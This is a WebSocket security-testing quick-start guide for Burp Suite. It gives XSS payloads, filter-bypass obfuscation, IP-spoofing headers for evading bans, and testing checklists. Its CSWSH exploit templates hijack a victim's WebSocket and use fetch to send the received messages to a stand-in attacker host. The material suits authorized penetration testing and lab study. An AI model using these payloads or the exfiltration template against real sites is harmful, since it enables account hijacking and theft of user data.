# WebSockets Security - Quick Start Guide

**Rapid WebSocket security testing reference**

---

## Prerequisites

**Required Tools:**
- Burp Suite (Community or Professional)
- Web browser configured with Burp proxy

---

## Key Payloads

### Message Manipulation — XSS via WebSocket

Intercept a WebSocket message in Burp and replace content with an XSS payload:

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

**Alternative Payloads**
```json
{"message":"<svg onload=alert(1)>"}
{"message":"<img src=x onerror=alert(document.domain)>"}
{"message":"<script>alert(1)</script>"}
```

---

## Handshake Exploitation

### IP Ban Bypass + XSS Filter Bypass

When a filter bans your IP or blocks standard XSS event handlers, combine:

**IP Spoofing** (add to WebSocket handshake headers in Burp Repeater):
```http
X-Forwarded-For: 1.1.1.1
```

**XSS Obfuscation** (mix case + backticks to bypass keyword filters):
```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```

**Why it works:**
- Case variation: `oNeRrOr` instead of `onerror` bypasses case-sensitive filters
- Backticks: `` alert`1` `` instead of `alert(1)` bypasses parenthesis filters

**Alternative IP Headers**
```http
X-Real-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
X-Client-IP: 1.1.1.1
```

**Alternative XSS Bypasses**
```json
{"message":"<svg OnLoAd=alert(1)>"}
{"message":"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>"}
{"message":"<body OnLoAd=alert(1)>"}
```

---

## CSWSH Exploit Template

When the WebSocket handshake uses only a session cookie (no CSRF token, no nonce), the connection is hijackable cross-origin:

```html
<script>
    var ws = new WebSocket('wss://target.com/chat');

    ws.onopen = function() {
        console.log('[+] Connected');
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        console.log('[+] Received:', event.data);
        fetch('https://attacker.com/collect', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

---

## Essential Payloads Cheat Sheet

### XSS Payloads
```html
<img src=1 onerror='alert(1)'>
<svg onload=alert(1)>
<script>alert(1)</script>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
```

### XSS Obfuscation
```html
<img src=1 oNeRrOr=alert(1)>          <!-- Case variation -->
<img src=1 onerror=alert`1`>           <!-- Backticks -->
<img src=1 onerror=alert(String.fromCharCode(88,83,83))>  <!-- Encoding -->
<svg OnLoAd=alert(1)>                  <!-- Case variation -->
```

### IP Spoofing Headers
```http
X-Forwarded-For: 1.1.1.1
X-Real-IP: 192.168.1.1
X-Originating-IP: 10.0.0.1
X-Client-IP: 8.8.8.8
True-Client-IP: 1.1.1.1
```

### CSWSH Template
```html
<script>
var ws = new WebSocket('wss://TARGET/PATH');
ws.onopen = () => ws.send("COMMAND");
ws.onmessage = (e) => fetch('https://ATTACKER', {method:'POST', body:e.data});
</script>
```

---

## Testing Methodology

### 1. Reconnaissance (5 minutes)
```
[] Identify WebSocket endpoints
[] Observe WebSocket traffic in Burp
[] Analyze message structure
[] Check handshake for CSRF tokens
[] Note authentication mechanism
```

### 2. Message Manipulation (10 minutes)
```
[] Test XSS payloads
[] Test SQL injection
[] Test command injection
[] Test path traversal
[] Test input validation bypasses
```

### 3. Handshake Exploitation (10 minutes)
```
[] Test IP spoofing headers
[] Test origin bypass
[] Test authentication bypass
[] Test custom headers
[] Test protocol manipulation
```

### 4. CSWSH Testing (15 minutes)
```
[] Check for CSRF tokens in handshake
[] Test origin validation
[] Create CSWSH PoC
[] Test data exfiltration
[] Attempt privilege escalation
```

---

## Common Vulnerabilities Checklist

### High Priority
```
[] Missing CSRF token in handshake (CSWSH)
[] No input validation (XSS, SQLi)
[] Trust in X-Forwarded-For header
[] Missing origin validation
[] No authentication on WebSocket endpoint
```

### Medium Priority
```
[] Unencrypted ws:// connections
[] No rate limiting
[] Missing authorization checks
[] Verbose error messages
[] Lack of message size limits
```

### Low Priority (Defense in Depth)
```
[] No connection timeouts
[] Missing security headers
[] Inadequate logging
[] No anomaly detection
[] Client-side validation only
```

---

## Quick Command Reference

### wscat (CLI Testing)
```bash
# Connect
wscat -c wss://target.com/chat

# With headers
wscat -c wss://target.com/chat -H "Cookie: session=abc"

# Send message on connect
wscat -c wss://target.com/chat -x "READY"
```

### Python Testing
```python
import asyncio
import websockets

async def test():
    uri = "wss://target.com/chat"
    async with websockets.connect(uri) as ws:
        await ws.send('{"message":"test"}')
        response = await ws.recv()
        print(response)

asyncio.run(test())
```

### JavaScript (Browser Console)
```javascript
var ws = new WebSocket('wss://target.com/chat');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.send(JSON.stringify({message: "test"}));
```

---

## Further Reference

For complete payload reference, exploitation scripts, tooling commands, and defense checklists, see: [websockets-cheat-sheet.md](./websockets-cheat-sheet.md)
